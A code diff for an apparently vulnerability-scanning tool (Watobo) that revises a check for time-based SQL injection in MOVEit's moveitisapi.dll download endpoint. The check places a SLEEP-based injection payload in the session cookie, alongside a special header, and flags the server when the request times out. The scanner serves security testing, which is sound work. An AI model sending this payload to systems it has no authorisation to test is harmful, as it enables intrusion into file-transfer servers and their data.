@@ -7,7 +7,7 @@ module Watobo #:nodoc: all
         class Moveit_sqlinjection < Watobo::ActiveCheck
 
           @info.update(
-              :check_name => 'MoveIt DMZ Version', # name of check which briefly describes functionality, will be used for tree and progress views
+              :check_name => 'MoveIt SQL Injection', # name of check which briefly describes functionality, will be used for tree and progress views
               :description => "This module performs SQL injection checks.", # description of checkfunction
               :author => "Andreas Schmidt", # author of check
               :version => "1.0", # check version
@@ -41,69 +41,52 @@ module Watobo #:nodoc: all
               begin
                 test_request = nil
                 test_response = nil
-
-
                 rtimes = []
-
-                vulnerable = false
 
                 3.times do
                   test = chat.copyRequest
                   start = Time.now().to_i
-                  timing_request, timing_response = doRequest(test, :default => true)
+                  t_request, t_response = doRequest(test, :default => true)
                   stop = Time.now().to_i
                   rtimes << (stop - start)
-
                 end
-                # now calculate the average time
-                average_t = rtimes.inject(:+) / rtimes.length
-                max_t = rtimes.max > 5 ? rtimes.max : 5
+
+                max_t = rtimes.max + 1
+                max_t += 1 if max_t < 2
 
                 timeout_t = 2 * max_t
 
-                test_value = ""
-                test = nil
-
-                timeout_counter = 0
                 output = ""
-                break if vulnerable
+
                 begin
-                  sqli_start = Time.now().to_i
-                  timeout(rtimes.max) do
+                  timeout(max_t.to_f) do
                     test = chat.copyRequest
                     test.set_header('X-siLock-AgentBrand', 'yourout')
-                    test.set_header("Cookie", "ASP.NET_SessionId=1111111111\' AND (SELECT * FROM (SELECT(SLEEP(#{timeout_t})))AAAA) -- ;")
+
+                    test.set_header("Cookie", "ASP.NET_SessionId=1111111111\\' AND (SELECT * FROM (SELECT(SLEEP(#{timeout_t})))AAAA) -- ;")
 
                     moveit_path = dir + '/moveitisapi/moveitisapi.dll?action=download'
 
                     test.set_path moveit_path
+                    test_request = test.copy
 
-                    test_request, test_response = doRequest(test, :default => true)
-                    sqli_stop = Time.now().to_i
+                    dummy_request, test_response = doRequest(test, :default => true)
+
                   end
                 rescue Timeout::Error
-                  duration = sqli_stop - sqli_start
-                  #  puts duration
-                  if (duration >= time_to_sleep)
-                    puts "Found time-based SQLi in parameter #{parm} !!!"
-                    puts "after #{duration}s / time-to-sleep #{time_to_sleep}s)"
-                    test_request.extend Watobo::Mixin::Parser::Url unless test_request.respond_to? :path
-                    path = "/" + test_request.path
 
-                    vulnerable = true
-                    output << "SleepTime: #{time_to_sleep}\nQuery Duration: #{duration}s"
+                  output << "Request didn't finish after max_t #{max_t}\nPrevious Response Times:\n#{rtimes}"
 
-                    addFinding(test_request, test_response,
-                               :check_pattern => "#{test_value}",
-                               :chat => chat,
-                               :title => "MOVEit SQLinjection",
-                               :proof_pattern => "",
-                               :test_item => parm[:name],
-                               :class => "MOVEit SQL-Injection",
-                               :output => output
-                    )
+                  addFinding(test_request, test_response,
+                             :check_pattern => 'ASP.NET_SessionId',
+                             :chat => chat,
+                             :title => 'moveitisapi.dll?action=download',
+                             :proof_pattern => "",
+                             :test_item => '/moveitisapi/moveitisapi.dll?action=download',
+                             :class => 'MOVEit SQL-Injection',
+                             :output => output
+                  )
 
-                  end
 
                 rescue => bang
                   puts bang
